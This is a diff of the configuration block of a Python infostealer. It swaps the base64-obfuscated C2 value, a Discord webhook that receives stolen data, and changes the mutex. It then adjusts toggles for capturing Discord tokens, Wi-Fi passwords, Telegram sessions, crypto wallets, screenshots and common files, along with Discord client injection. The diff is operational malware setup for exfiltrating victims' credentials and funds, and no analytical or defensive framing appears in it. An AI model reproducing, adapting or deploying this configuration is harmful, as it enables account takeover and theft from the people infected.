@@ -21,8 +21,8 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODQ4MzM2MjgyOTYzNTU5NC9EdVNCY1JDSDlJUWFqSEMxaktMeUlmem5KckZrWmVrN0FtcnZYZ0gyTGpsZ0k4M1ZfbmExY3J4ZERCQ3AzNXhpWlR1YQ==').decode())
-    Mutex = base64.b64decode('TTBTYzFISXFoQkx5RXZNWA==').decode()
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5ODA4NjQ2MjMzMDYzNDI5MC9pcVZYY3ptMFRnWFNWcnN3MDBfREJqbE9wTklfSXRMTlhlNERGeWk3UUhSRURzMnlsNVNWd3RGZVlyYkxfeU5HWHhnMA==').decode())
+    Mutex = base64.b64decode('OEw1UGt1MXV2Z0JzTnhUcQ==').decode()
     PingMe = bool('true')
     Vmprotect = bool('true')
     Startup = bool('')
@@ -40,13 +40,13 @@ class Settings:
     CaptureDiscordTokens = bool('true')
     CaptureGames = bool('true')
     CaptureWifiPasswords = bool('true')
-    CaptureSystemInfo = bool('true')
+    CaptureSystemInfo = bool('')
     CaptureScreenshot = bool('true')
     CaptureTelegram = bool('true')
-    CaptureCommonFiles = bool('')
+    CaptureCommonFiles = bool('true')
     CaptureWallets = bool('true')
     FakeError = (bool(''), ('', '', '0'))
-    BlockAvSites = bool('true')
+    BlockAvSites = bool('')
     DiscordInjection = bool('true')
 if not hasattr(sys, '_MEIPASS'):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
